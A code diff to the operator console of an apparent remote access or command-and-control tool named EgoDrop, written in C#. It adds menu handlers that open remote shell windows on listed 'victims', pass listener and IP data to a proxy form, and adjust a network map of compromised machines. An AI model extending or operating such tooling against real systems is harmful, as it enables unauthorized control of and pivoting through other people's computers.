@@ -374,7 +374,7 @@ namespace EgoDrop
                                 status = NetworkView.enMachineStatus.Windows_Super;
                         }
 
-                        var n1 = networkView1.AddNode($"{szVictim}", $"{szUsername}@{szVictim}\n{szIPv4}", status);
+                        var n1 = networkView1.AddNode($"{szVictim}", $"{szUsername}@{szIPv4}", status);
 
                         clsVictim victim = fnGetVictimWithID(szVictim);
                         victim.fnAddVictimChain(szVictim, lsVictim[..(i + 1)]);
@@ -429,6 +429,9 @@ namespace EgoDrop
             treeView2.ImageList = smallImageList;
 
             networkView1.Zoom = 1.0f;
+
+            toolStripButton1.Checked = true;
+            toolStripButton2.Checked = false;
         }
 
         private void frmMain_Load(object sender, EventArgs e)
@@ -567,7 +570,7 @@ namespace EgoDrop
                 frmShell f = clsTools.fnFindForm<frmShell>(victim, szVictimID);
                 if (f == null)
                 {
-                    f = new frmShell(victim);
+                    f = new frmShell(victim, szVictimID);
                     f.Show();
                 }
                 else
@@ -593,7 +596,9 @@ namespace EgoDrop
 
             clsVictim victim = fnGetVictimFromTag(item);
 
-            frmServerProxy f = new frmServerProxy(szID, victim);
+            string szIPv4 = node.szDisplayName.Split('@').Last();
+
+            frmServerProxy f = new frmServerProxy(szID, victim, m_dicListener, szIPv4);
             f.Show();
         }
 
@@ -711,6 +716,91 @@ namespace EgoDrop
             if (f == null)
             {
                 f = new frmFileMgr(szID, victim, fnbIsUnixLike(item));
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
+        }
+
+        private void toolStripButton1_Click(object sender, EventArgs e)
+        {
+            toolStripButton1.Checked = true;
+            toolStripButton2.Checked = false;
+        }
+
+        private void toolStripButton2_Click(object sender, EventArgs e)
+        {
+            toolStripButton1.Checked = false;
+            toolStripButton2.Checked = true;
+        }
+
+        private void toolStripMenuItem19_Click(object sender, EventArgs e)
+        {
+            Node node = networkView1.SelectedNode;
+            if (node == null)
+                return;
+
+            string szID = node.szVictimID;
+            clsVictim victim = fnGetVictimWithID(szID);
+            if (victim == null)
+                return;
+
+            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
+            if (item == null)
+                return;
+
+            frmShell f = clsTools.fnFindForm<frmShell>(victim, szID);
+            if (f == null)
+            {
+                f = new frmShell(victim, szID);
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
+        }
+
+        private void toolStripMenuItem20_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                string szVictimID = fnszGetVictimID(item);
+                clsVictim victim = fnGetVictimFromTag(item);
+                frmShell f = clsTools.fnFindForm<frmShell>(victim, szVictimID);
+                if (f == null)
+                {
+                    f = new frmShell(victim, szVictimID);
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
+            }
+        }
+
+        private void toolStripMenuItem25_Click(object sender, EventArgs e)
+        {
+            Node node = networkView1.SelectedNode;
+            if (node == null)
+                return;
+
+            string szID = node.szVictimID;
+            clsVictim victim = fnGetVictimWithID(szID);
+            if (victim == null)
+                return;
+
+            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
+            if (item == null)
+                return;
+
+            frmShell f = clsTools.fnFindForm<frmShell>(victim, szID);
+            if (f == null)
+            {
+                f = new frmShell(victim, szID);
                 f.Show();
             }
             else
